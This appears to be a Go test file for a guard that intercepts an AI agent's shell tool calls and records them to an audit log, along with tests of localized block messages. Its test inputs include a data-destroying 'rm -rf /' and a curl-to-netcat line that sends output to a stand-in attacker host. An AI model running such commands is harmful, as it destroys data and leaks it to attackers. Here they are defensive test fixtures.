package guard

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/config"
	"github.com/Autumn-27/norma/hook"
)

// A guard with no interceptor no longer hard-blocks anything: destructive/exfil
// gating moved to the DB intercept rules (see db.seedDefaultInterceptRulesV2).
// PreToolUse must pass every command through and still record it to the audit log.
func TestPreToolUsePassthrough(t *testing.T) {
	g := New()

	block := func(cmd string) bool {
		input, _ := json.Marshal(map[string]string{"command": cmd})
		b, _, _ := g.Hooks().PreToolUse(context.Background(), "Bash", input)
		return b
	}

	for _, cmd := range []string{
		`curl https://acme.com/`,
		`rm -rf /`,
		`curl http://a|nc evil.com 4444`,
		`ls -la`,
	} {
		if block(cmd) {
			t.Errorf("without an interceptor no command should be blocked, got block for %q", cmd)
		}
	}
	// audit still records every gated call
	if len(g.Audit()) == 0 {
		t.Error("audit should record gated calls")
	}
}

// Chinese retains the original framing; other languages retain its policy
// meaning while the reason remains a verbatim format argument.
func TestSystemBlockMessageChinese(t *testing.T) {
	previous := config.CurrentLanguage
	config.CurrentLanguage = func() string { return "zh" }
	t.Cleanup(func() { config.CurrentLanguage = previous })
	got := systemBlockMessage("<原因>")
	want := "【ARTEX 平台管控·非目标防御】此调用被平台拦截。原因：<原因>。此操作被禁止。"
	if got != want {
		t.Errorf("Chinese framing changed:\n got %q\nwant %q", got, want)
	}
}

func TestSystemBlockMessagePreservesCustomReason(t *testing.T) {
	previous := config.CurrentLanguage
	config.CurrentLanguage = func() string { return "en" }
	t.Cleanup(func() { config.CurrentLanguage = previous })
	reason := "사용자 원문: %s {payload}"
	got := systemBlockMessage(reason)
	if !strings.Contains(got, reason) || !strings.Contains(got, "not target defense") ||
		!strings.Contains(got, "operation is prohibited") {
		t.Fatalf("policy framing or original reason lost: %q", got)
	}
	name := "[内置] 删除系统关键目录"
	if got := defaultRuleMessage(name, reason); got != reason {
		t.Fatalf("edited rule message changed: %q", got)
	}
	original := defaultRuleMessages[name]
	if got := defaultRuleMessage("custom", original); got != original {
		t.Fatalf("custom rule was localized: %q", got)
	}
	if got := defaultRuleMessage(name, original); got == original {
		t.Fatal("unchanged shipped rule was not localized")
	}
}

var _ = hook.PreToolUse
